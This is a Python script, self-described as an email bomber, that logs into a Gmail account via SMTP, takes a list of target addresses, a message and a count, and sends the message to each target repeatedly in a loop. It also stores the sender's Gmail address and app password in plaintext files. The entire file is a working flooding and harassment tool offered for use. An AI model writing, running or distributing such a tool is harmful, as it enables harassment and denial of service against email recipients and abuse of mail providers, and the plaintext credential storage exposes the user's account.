import smtplib
from os import access, path, mkdir
from email.message import EmailMessage


# Function to read a file's content
def read_file(file_path):
    with open(file_path, 'rt', encoding='utf-8') as file:
        return file.read().strip()



# Function to save user credentials
def save_credentials(sender, app_password):
    try:
        mkdir("User_Credentials")
        with open("User_Credentials/sender.txt", "xt") as sender_file:
            sender_file.write(sender)
        with open("User_Credentials/app_password.txt", "xt") as pass_file:
            pass_file.write(app_password)
        print("\nYour credentials have been saved.")
    except OSError as e:
        print(f"\nError: {e} - Unable to save your credentials.")


# Function to send email
def send_email(server, sender, receiver, message):
    try:
        server.sendmail(from_addr=sender, to_addrs=receiver.strip(), msg=message.as_string())
        print(f"Email sent successfully to {receiver}!")
    except smtplib.SMTPException as error:
        print(f"Failed to send email to {receiver}. Error: {error}")


# Main function to handle email bombing
def email_bomber():
    # Display welcome message
    print(f"{read_file('Welcome/welcome.txt')}\n\n")

    # Get user credentials
    if not path.exists("User_Credentials"):
        sender = input("Enter the Gmail address you would like to send emails from (example@gmail.com) -> ")
        app_password = input("Enter the app's password (xxxx xxxx xxxx xxxx) -> ")
    else:
        sender = read_file("User_Credentials/sender.txt")
        app_password = read_file("User_Credentials/app_password.txt")

    print("If you would like to spam more than one email, separate the emails by commas (example@gmail.com, example2@hotmail.com, example3@myspace.com)")

    # Get email details from user
    receiver = input("Specify the email(s) you would like to email-bomb -> ")
    subject = input("Enter the subject for your email-bomber message -> ")
    msg = input("Enter your email-bomber message -> ")

    # Create the email message
    message = EmailMessage()
    message.set_content(msg, subtype="plain", charset='us-ascii')
    message["Subject"] = subject  # Set the subject for the email

    # Loop until a valid count value is provided
    while True:
        try:
            count = int(input("Enter a number for the amount of emails to be sent -> "))
            if count > 0:
                break
            else:
                print("Count must be positive. Received", count)
        except ValueError:
            print("Please enter a valid integer.")
        except KeyboardInterrupt:
            print("Goodbye!")
            return

    # Connect to SMTP server
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(user=sender, password=app_password)
    except smtplib.SMTPAuthenticationError as error:
        print("\nError: Invalid Gmail address or app password. Please ensure you have set up the app password correctly.")
        print(f"Details: {error}")
        return

    # Save credentials if not already saved
    if not path.exists("User_Credentials"):
        save_credentials(sender, app_password)

    print("\nEmail-bomber has started...\n")

    # Loop through count and send emails
    receivers_list = [email.strip() for email in receiver.split(",")]
    for i in range(count):
        for email_receiver in receivers_list:
            send_email(server, sender, email_receiver, message)

    print("\nEmail-bomber was successful!\n")
    server.quit()


# Run the email bomber
email_bomber()
